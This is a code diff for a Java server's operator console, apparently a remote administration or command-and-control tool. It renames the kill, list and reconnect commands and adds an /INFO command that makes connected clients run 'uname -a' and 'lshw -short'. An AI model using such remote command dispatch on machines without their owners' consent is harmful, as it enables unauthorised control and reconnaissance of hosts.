@@ -37,22 +37,29 @@ public class InputListener extends Thread {
 
 
         try {
+            String ipAddress = Main.getIp();
+
+
             for (Connection c : Main.server.getConnections()) {
                 if (Main.authenticatedClients.containsKey(c.getRemoteAddressTCP().getAddress().getHostAddress())) {
-                    if (input.equals("_KILL_")) {
+                    if (input.equals("/KILL")) {
                         c.sendTCP(new KillRequest(false));
                         Main.commandLog("--SENT KILL REQUEST--", c.getRemoteAddressTCP().getAddress().getHostAddress(), Main.authenticatedClients.get(c.getRemoteAddressTCP().getAddress().getHostAddress()));
                         Main.authenticatedClients.remove(c.getRemoteAddressTCP().getAddress().getHostAddress());
                         continue;
-                    } else if (input.equals("_LIST_")) {
+                    } else if (input.equals("/LIST")) {
                         System.out.println(Main.ANSI_GREEN+"------ Connection "+c.getID()+" ------");
                         System.out.println(Main.ANSI_RED + "[" + c.getRemoteAddressTCP().getAddress().getHostAddress() + "] " + Main.ANSI_YELLOW + "[" + Main.authenticatedClients.get(c.getRemoteAddressTCP().getAddress().getHostAddress()) + "]");
                         continue;
 
-                    } else if (input.equals("_RECONNECT_")) {
-                        c.sendTCP(new ReconnectRequest(2000));
+                    } else if (input.equals("/RECONNECT")) {
+                        c.sendTCP(new ReconnectRequest(Main.RECONNECT_REQUEST_TIMEOUT, ipAddress));
                         Main.commandLog("--SENT RECONNECT REQUEST--", c.getRemoteAddressTCP().getAddress().getHostAddress(), Main.authenticatedClients.get(c.getRemoteAddressTCP().getAddress().getHostAddress()));
                         Main.reconnectRequest = true;
+                        continue;
+                    } else if (input.equals("/INFO") ) {
+                        c.sendTCP(new Command("uname -a"));
+                        c.sendTCP(new Command("lshw -short"));
                         continue;
                     }
 
